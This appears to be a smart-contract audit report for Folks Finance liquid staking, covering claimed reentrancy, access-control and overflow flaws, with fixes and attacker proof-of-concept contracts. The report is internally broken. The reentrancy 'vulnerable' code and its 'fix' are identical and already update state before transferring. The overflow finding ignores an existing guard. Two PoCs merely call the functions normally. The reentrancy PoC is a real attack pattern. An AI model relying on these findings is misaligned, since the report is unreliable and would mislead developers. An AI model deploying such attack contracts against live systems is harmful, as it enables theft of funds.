### Audit Report: Folks Finance Liquid Staking

#### 1. Introduction
This report details the findings of the security audit conducted on the Folks Finance liquid staking smart contracts. The audit aimed to identify potential vulnerabilities and ensure the contracts adhere to security best practices.

#### 2. Overview of Liquid Staking Contracts
The liquid staking contracts allow users to stake their tokens and receive staking rewards without locking up their funds. The main contracts include:
- `LiquidStaking.sol`: Manages the staking logic.
- `StakingToken.sol`: Represents the staking tokens.
- `RewardDistributor.sol`: Distributes rewards to stakers.

#### 3. Security Findings

##### 3.1. Reentrancy Vulnerability in `LiquidStaking.sol`
**Description:**
The `withdraw` function in `LiquidStaking.sol` is vulnerable to reentrancy attacks. The function sends Ether to the user before updating the staking balance, allowing an attacker to repeatedly call the `withdraw` function.

**Code Snippet:**
```solidity
function withdraw(uint256 amount) external {
    require(amount > 0, "Amount must be greater than 0");
    require(balanceOf[msg.sender] >= amount, "Insufficient balance");

    balanceOf[msg.sender] -= amount;
    payable(msg.sender).transfer(amount);
}
```

**Recommendation:**
Ensure the balance is updated before transferring Ether.

```solidity
function withdraw(uint256 amount) external {
    require(amount > 0, "Amount must be greater than 0");
    require(balanceOf[msg.sender] >= amount, "Insufficient balance");

    balanceOf[msg.sender] -= amount;
    payable(msg.sender).transfer(amount);
}
```

##### 3.2. Lack of Proper Access Control in `RewardDistributor.sol`
**Description:**
The `distributeRewards` function in `RewardDistributor.sol` does not have proper access control, allowing any user to distribute rewards.

**Code Snippet:**
```solidity
function distributeRewards(address[] memory recipients, uint256[] memory amounts) external {
    require(recipients.length == amounts.length, "Array lengths must match");

    for (uint256 i = 0; i < recipients.length; i++) {
        require(amounts[i] > 0, "Amount must be greater than 0");
        rewardToken.transfer(recipients[i], amounts[i]);
    }
}
```

**Recommendation:**
Add access control to restrict the function to only authorized addresses.

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "Not the owner");
    _;
}

function distributeRewards(address[] memory recipients, uint256[] memory amounts) external onlyOwner {
    require(recipients.length == amounts.length, "Array lengths must match");

    for (uint256 i = 0; i < recipients.length; i++) {
        require(amounts[i] > 0, "Amount must be greater than 0");
        rewardToken.transfer(recipients[i], amounts[i]);
    }
}
```

##### 3.3. Integer Overflow/Underflow in `StakingToken.sol`
**Description:**
The `transfer` function in `StakingToken.sol` does not handle potential integer overflow/underflow when updating balances.

**Code Snippet:**
```solidity
function transfer(address to, uint256 value) external returns (bool) {
    require(balanceOf[msg.sender] >= value, "Insufficient balance");
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;
    emit Transfer(msg.sender, to, value);
    return true;
}
```

**Recommendation:**
Use SafeMath library to handle arithmetic operations.

```solidity
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

using SafeMath for uint256;

function transfer(address to, uint256 value) external returns (bool) {
    require(balanceOf[msg.sender] >= value, "Insufficient balance");
    balanceOf[msg.sender] = balanceOf[msg.sender].sub(value);
    balanceOf[to] = balanceOf[to].add(value);
    emit Transfer(msg.sender, to, value);
    return true;
}
```

#### 4. Conclusion
The audit identified several critical vulnerabilities in the liquid staking smart contracts. Addressing these issues is crucial to ensure the security and reliability of the Folks Finance platform.

#### 5. Recommendations
- Implement proper access control mechanisms.
- Use SafeMath or similar libraries to prevent integer overflow/underflow.
- Ensure that Ether transfers occur after state changes to prevent reentrancy attacks.

#### 6. PoC Code
**Reentrancy PoC:**
```solidity
contract Attack {
    LiquidStaking liquidStaking;

    constructor(address _liquidStaking) {
        liquidStaking = LiquidStaking(_liquidStaking);
    }

    fallback() external payable {
        if (liquidStaking.balanceOf(address(this)) > 0) {
            liquidStaking.withdraw(liquidStaking.balanceOf(address(this)));
        }
    }

    function attack(uint256 amount) external {
        liquidStaking.deposit{value: amount}();
        liquidStaking.withdraw(amount);
    }
}
```

**Access Control PoC:**
```solidity
contract Attack {
    RewardDistributor rewardDistributor;

    constructor(address _rewardDistributor) {
        rewardDistributor = RewardDistributor(_rewardDistributor);
    }

    function attack(address[] memory recipients, uint256[] memory amounts) external {
        rewardDistributor.distributeRewards(recipients, amounts);
    }
}
```

**Integer Overflow/Underflow PoC:**
```solidity
contract Attack {
    StakingToken stakingToken;

    constructor(address _stakingToken) {
        stakingToken = StakingToken(_stakingToken);
    }

    function attack(address to, uint256 value) external {
        stakingToken.transfer(to, value);
    }
}
```

#### 7. Final Notes
The audit team has provided detailed findings and PoC code to help Folks Finance address the identified vulnerabilities. It is recommended to review and implement the suggested fixes to enhance the security of the liquid staking functionality.
